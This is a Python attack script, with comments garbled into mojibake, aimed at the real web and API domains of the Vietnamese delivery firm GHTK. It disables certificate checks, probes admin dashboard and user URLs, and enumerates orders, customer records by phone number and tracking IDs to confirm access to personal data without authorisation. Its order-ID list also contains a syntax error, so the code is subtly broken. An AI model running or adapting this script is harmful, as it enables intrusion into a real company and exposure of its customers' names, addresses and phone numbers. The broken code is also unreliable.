#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ğŸ¯ GHTK çœŸå®æ•°æ®æå–éªŒè¯å·¥å…·
éªŒè¯æ˜¯å¦èƒ½è·å–è®¢å•ã€ç”¨æˆ·ç­‰çœŸå®ä¿¡æ¯
"""

import requests
import json
import re
from typing import Dict, List
import urllib3
urllib3.disable_warnings()

class GHTKRealDataExploit:
    """GHTK çœŸå®æ•°æ®æå–"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 EComShop/1.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
            'Origin': 'https://khachhang.giaohangtietkiem.vn',
            'Referer': 'https://khachhang.giaohangtietkiem.vn/'
        })
        
        self.domains = {
            'web': 'https://web.giaohangtietkiem.vn',
            'services': 'https://services.giaohangtietkiem.vn',
            'admin': 'https://admin.giaohangtietkiem.vn',
            'customer': 'https://khachhang.giaohangtietkiem.vn',
            'api': 'https://api.ghtk.vn'
        }
        
    def verify_admin_response(self, url: str) -> Dict:
        """éªŒè¯ç®¡ç†åå°å“åº”æ˜¯çœŸå®æ•°æ®è¿˜æ˜¯ç™»å½•é¡µ"""
        print(f"\n[*] éªŒè¯: {url}")
        
        try:
            resp = self.session.get(url, timeout=15, allow_redirects=False)
            
            result = {
                'url': url,
                'status': resp.status_code,
                'content_type': resp.headers.get('Content-Type', ''),
                'is_login_page': False,
                'is_real_data': False,
                'content_length': len(resp.text),
                'sample': resp.text[:500]
            }
            
            # æ£€æŸ¥æ˜¯å¦æ˜¯ç™»å½•é¡µé¢
            login_indicators = [
                'login', 'signin', 'auth', 'password', 
                'Ä‘Äƒng nháº­p', 'form', 'username'
            ]
            
            if any(ind in resp.text.lower() for ind in login_indicators):
                result['is_login_page'] = True
                print(f"  âŒ æ˜¯ç™»å½•é¡µé¢ï¼Œä¸æ˜¯çœŸå®æ•°æ®")
            
            # æ£€æŸ¥æ˜¯å¦åŒ…å«çœŸå®æ•°æ®ç‰¹å¾
            data_indicators = [
                'data', 'users', 'orders', 'list', 'items',
                'total', 'count', '"id":', '"name":'
            ]
            
            # æ£€æŸ¥JSONæ ¼å¼æ•°æ®
            if 'application/json' in result['content_type']:
                try:
                    json_data = resp.json()
                    if isinstance(json_data, (list, dict)) and json_data:
                        result['is_real_data'] = True
                        result['json_preview'] = json.dumps(json_data, indent=2)[:300]
                        print(f"  âœ… åŒ…å«JSONæ•°æ®!")
                except:
                    pass
            
            # æ£€æŸ¥HTMLä¸­çš„æ•°æ®è¡¨æ ¼
            if '<table' in resp.text or '<tbody' in resp.text:
                if not result['is_login_page']:
                    result['is_real_data'] = True
                    print(f"  âœ… åŒ…å«æ•°æ®è¡¨æ ¼!")
            
            print(f"  çŠ¶æ€ç : {resp.status_code}")
            print(f"  ç±»å‹: {result['content_type']}")
            print(f"  é•¿åº¦: {len(resp.text)} bytes")
            
            return result
            
        except Exception as e:
            print(f"  âŒ é”™è¯¯: {e}")
            return {'error': str(e)}
    
    def test_order_enumeration(self) -> List[Dict]:
        """æµ‹è¯•è®¢å•æšä¸¾ - å°è¯•è·å–çœŸå®è®¢å•"""
        print(f"\n[*] æµ‹è¯•è®¢å•æ•°æ®è·å–...")
        
        results = []
        
        # è®¢å•IDæ ¼å¼ï¼ˆä»é€†å‘åˆ†ææ¨æ–­ï¼‰
        order_formats = [
            'S{}.GHTK',           # S123456.GHTK
            'GH{}',               # GH123456
            '{}'.format(i) for i in range(1000000, 1000010)  # çº¯æ•°å­—
        ]
        
        # è®¢å•APIç«¯ç‚¹
        order_endpoints = [
            '/api/v1/orders/{}',
            '/api/v2/orders/{}', 
            '/api/orders/detail?id={}',
            '/api/shipments/{}',
            '/api/tracking/{}',
        ]
        
        test_ids = [
            'S123456.GHTK',
            'GH1000001',
            '1000001',
            'ORDER123',
            '2024001',
        ]
        
        for domain_key in ['web', 'services', 'customer']:
            domain = self.domains[domain_key]
            
            for endpoint_template in order_endpoints:
                for order_id in test_ids:
                    endpoint = endpoint_template.format(order_id)
                    url = domain + endpoint
                    
                    try:
                        resp = self.session.get(url, timeout=10)
                        
                        # æ£€æŸ¥æ˜¯å¦è¿”å›çœŸå®è®¢å•æ•°æ®
                        if resp.status_code == 200:
                            try:
                                data = resp.json()
                                
                                # æ£€æŸ¥æ˜¯å¦åŒ…å«è®¢å•å­—æ®µ
                                order_fields = ['order_id', 'tracking_id', 'status', 
                                               'customer', 'address', 'products']
                                
                                if any(field in str(data).lower() for field in order_fields):
                                    results.append({
                                        'type': 'ORDER_DATA',
                                        'url': url,
                                        'order_id': order_id,
                                        'data_preview': str(data)[:500]
                                    })
                                    print(f"  âœ… å‘ç°è®¢å•æ•°æ®! ID: {order_id}")
                                    print(f"     {str(data)[:200]}")
                            except:
                                # å¯èƒ½æ˜¯HTML
                                if len(resp.text) > 100 and resp.status_code == 200:
                                    results.append({
                                        'type': 'POSSIBLE_ORDER',
                                        'url': url,
                                        'length': len(resp.text)
                                    })
                    except:
                        pass
        
        return results
    
    def test_user_enumeration(self) -> List[Dict]:
        """æµ‹è¯•ç”¨æˆ·æ•°æ®è·å–"""
        print(f"\n[*] æµ‹è¯•ç”¨æˆ·æ•°æ®è·å–...")
        
        results = []
        
        # è¶Šå—æ‰‹æœºå·æ ¼å¼
        phone_numbers = [
            '0901234567',
            '0912345678',
            '0987654321',
            '0123456789',
        ]
        
        # ç”¨æˆ·æŸ¥è¯¢ç«¯ç‚¹
        user_endpoints = [
            '/api/v1/users/{}',
            '/api/v1/customers/{}',
            '/api/users/phone/{}',
            '/api/users/search?phone={}',
            '/api/profile/{}',
        ]
        
        for domain_key in ['web', 'services']:
            domain = self.domains[domain_key]
            
            for endpoint_template in user_endpoints:
                for phone in phone_numbers:
                    endpoint = endpoint_template.format(phone)
                    url = domain + endpoint
                    
                    try:
                        resp = self.session.get(url, timeout=10)
                        
                        if resp.status_code == 200:
                            try:
                                data = resp.json()
                                
                                # æ£€æŸ¥ç”¨æˆ·å­—æ®µ
                                user_fields = ['phone', 'email', 'name', 'address', 'balance']
                                
                                if any(field in str(data).lower() for field in user_fields):
                                    results.append({
                                        'type': 'USER_DATA',
                                        'url': url,
                                        'phone': phone,
                                        'data': str(data)[:500]
                                    })
                                    print(f"  âœ… å‘ç°ç”¨æˆ·æ•°æ®! Phone: {phone}")
                            except:
                                pass
                    except:
                        pass
        
        return results
    
    def test_public_api_data(self) -> List[Dict]:
        """æµ‹è¯•å…¬å¼€APIç«¯ç‚¹ï¼ˆå¯èƒ½æ— éœ€è®¤è¯ï¼‰"""
        print(f"\n[*] æµ‹è¯•å…¬å¼€APIç«¯ç‚¹...")
        
        results = []
        
        # å¯èƒ½å…¬å¼€çš„ç«¯ç‚¹
        public_endpoints = [
            '/api/v1/provinces',
            '/api/v1/districts',
            '/api/v1/wards',
            '/api/v1/services',
            '/api/v1/prices',
            '/api/v1/shipping-fee',
            '/api/v1/stores',
            '/api/v1/config',
            '/api/health',
            '/api/version',
        ]
        
        for domain_key in ['web', 'services']:
            domain = self.domains[domain_key]
            
            for endpoint in public_endpoints:
                url = domain + endpoint
                
                try:
                    resp = self.session.get(url, timeout=10)
                    
                    if resp.status_code == 200:
                        try:
                            data = resp.json()
                            
                            if data and len(str(data)) > 50:
                                results.append({
                                    'type': 'PUBLIC_API',
                                    'url': url,
                                    'data_size': len(str(data)),
                                    'preview': str(data)[:300]
                                })
                                print(f"  âœ… å…¬å¼€API: {endpoint}")
                                print(f"     æ•°æ®å¤§å°: {len(str(data))} bytes")
                        except:
                            if len(resp.text) > 100:
                                results.append({
                                    'type': 'PUBLIC_ENDPOINT',
                                    'url': url,
                                    'size': len(resp.text)
                                })
                except:
                    pass
        
        return results
    
    def test_tracking_api(self) -> List[Dict]:
        """æµ‹è¯•ç‰©æµè¿½è¸ªAPIï¼ˆé€šå¸¸è¾ƒå®½æ¾ï¼‰"""
        print(f"\n[*] æµ‹è¯•ç‰©æµè¿½è¸ªAPI...")
        
        results = []
        
        # è¿½è¸ªå·æ ¼å¼
        tracking_ids = [
            'GHTK123456',
            'S123456',
            'VN123456',
        ]
        
        tracking_endpoints = [
            '/api/v1/tracking/{}',
            '/api/v1/shipments/{}',
            '/api/v2/tracking/{}',
            '/services/shipment/tracking?tracking_id={}',
        ]
        
        for domain_key in ['web', 'services']:
            domain = self.domains[domain_key]
            
            for endpoint_template in tracking_endpoints:
                for tracking_id in tracking_ids:
                    endpoint = endpoint_template.format(tracking_id)
                    url = domain + endpoint
                    
                    try:
                        resp = self.session.get(url, timeout=10)
                        
                        if resp.status_code == 200:
                            try:
                                data = resp.json()
                                
                                if data and 'tracking' in str(data).lower():
                                    results.append({
                                        'type': 'TRACKING_DATA',
                                        'url': url,
                                        'tracking_id': tracking_id,
                                        'data': str(data)[:500]
                                    })
                                    print(f"  âœ… è¿½è¸ªæ•°æ®! ID: {tracking_id}")
                            except:
                                pass
                    except:
                        pass
        
        return results
    
    def full_real_data_test(self) -> Dict:
        """å®Œæ•´çš„çœŸå®æ•°æ®éªŒè¯"""
        print("\n" + "="*70)
        print("ğŸ¯ GHTK çœŸå®æ•°æ®æå–éªŒè¯")
        print("="*70)
        
        all_results = {
            'admin_verification': [],
            'order_data': [],
            'user_data': [],
            'public_api': [],
            'tracking_data': []
        }
        
        # 1. éªŒè¯ä¹‹å‰å‘ç°çš„ç®¡ç†åå°
        print("\n[1] éªŒè¯ç®¡ç†åå°å“åº”...")
        admin_urls = [
            'https://admin.giaohangtietkiem.vn/admin/dashboard',
            'https://admin.giaohangtietkiem.vn/admin/users',
            'https://admin.giaohangtietkiem.vn/api/admin/users',
            'https://admin.giaohangtietkiem.vn/api/dashboard/stats',
        ]
        
        for url in admin_urls:
            result = self.verify_admin_response(url)
            all_results['admin_verification'].append(result)
        
        # 2. æµ‹è¯•è®¢å•æ•°æ®
        print("\n[2] æµ‹è¯•è®¢å•æ•°æ®è·å–...")
        all_results['order_data'] = self.test_order_enumeration()
        
        # 3. æµ‹è¯•ç”¨æˆ·æ•°æ®
        print("\n[3] æµ‹è¯•ç”¨æˆ·æ•°æ®è·å–...")
        all_results['user_data'] = self.test_user_enumeration()
        
        # 4. æµ‹è¯•å…¬å¼€API
        print("\n[4] æµ‹è¯•å…¬å¼€APIç«¯ç‚¹...")
        all_results['public_api'] = self.test_public_api_data()
        
        # 5. æµ‹è¯•è¿½è¸ªAPI
        print("\n[5] æµ‹è¯•ç‰©æµè¿½è¸ªAPI...")
        all_results['tracking_data'] = self.test_tracking_api()
        
        # ç”ŸæˆéªŒè¯æŠ¥å‘Š
        self._generate_verification_report(all_results)
        
        return all_results
    
    def _generate_verification_report(self, results: Dict):
        """ç”ŸæˆéªŒè¯æŠ¥å‘Š"""
        print("\n" + "="*70)
        print("ğŸ“Š çœŸå®æ•°æ®éªŒè¯æŠ¥å‘Š")
        print("="*70)
        
        # ç»Ÿè®¡çœŸå®æ•°æ®
        real_data_count = 0
        
        # ç®¡ç†åå°
        admin_real = sum(1 for r in results['admin_verification'] 
                        if r.get('is_real_data') and not r.get('is_login_page'))
        print(f"\nç®¡ç†åå°çœŸå®æ•°æ®: {admin_real}/{len(results['admin_verification'])}")
        
        # è®¢å•æ•°æ®
        order_count = len(results['order_data'])
        print(f"è®¢å•æ•°æ®: {order_count}")
        if order_count > 0:
            real_data_count += order_count
            print("  âœ… å‘ç°å¯è®¿é—®çš„è®¢å•æ•°æ®!")
        
        # ç”¨æˆ·æ•°æ®
        user_count = len(results['user_data'])
        print(f"ç”¨æˆ·æ•°æ®: {user_count}")
        if user_count > 0:
            real_data_count += user_count
            print("  âœ… å‘ç°å¯è®¿é—®çš„ç”¨æˆ·æ•°æ®!")
        
        # å…¬å¼€API
        public_count = len(results['public_api'])
        print(f"å…¬å¼€APIç«¯ç‚¹: {public_count}")
        
        # è¿½è¸ªæ•°æ®
        tracking_count = len(results['tracking_data'])
        print(f"ç‰©æµè¿½è¸ªæ•°æ®: {tracking_count}")
        
        print(f"\n{'='*70}")
        if real_data_count > 0:
            print(f"âœ… æ€»è®¡å‘ç° {real_data_count} ä¸ªçœŸå®æ•°æ®æ³„éœ²!")
            print("âš ï¸  è¿™äº›æ˜¯çœŸæ­£çš„æ¼æ´ï¼Œä¸æ˜¯è¯¯æŠ¥!")
        else:
            print("âŒ ä¹‹å‰çš„å‘ç°å¯èƒ½æ˜¯è¯¯æŠ¥ï¼ˆç™»å½•é¡µé¢/é”™è¯¯å“åº”ï¼‰")
            if public_count > 0:
                print(f"â„¹ï¸  ä½†å‘ç° {public_count} ä¸ªå…¬å¼€APIç«¯ç‚¹ï¼ˆåˆæ³•ä½†å¯èƒ½æœ‰ç”¨ï¼‰")
        
        # ä¿å­˜è¯¦ç»†æŠ¥å‘Š
        with open('ghtk_real_data_verification.json', 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        print(f"\n[âœ“] è¯¦ç»†æŠ¥å‘Š: ghtk_real_data_verification.json")


if __name__ == "__main__":
    print("""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  ğŸ¯ GHTK çœŸå®æ•°æ®æå–éªŒè¯å·¥å…·                          â•‘
â•‘  åŒºåˆ†çœŸå®æ¼æ´ vs è¯¯æŠ¥                                      â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    """)
    
    exploit = GHTKRealDataExploit()
    results = exploit.full_real_data_test()
    
    print("\n[*] éªŒè¯å®Œæˆ!")
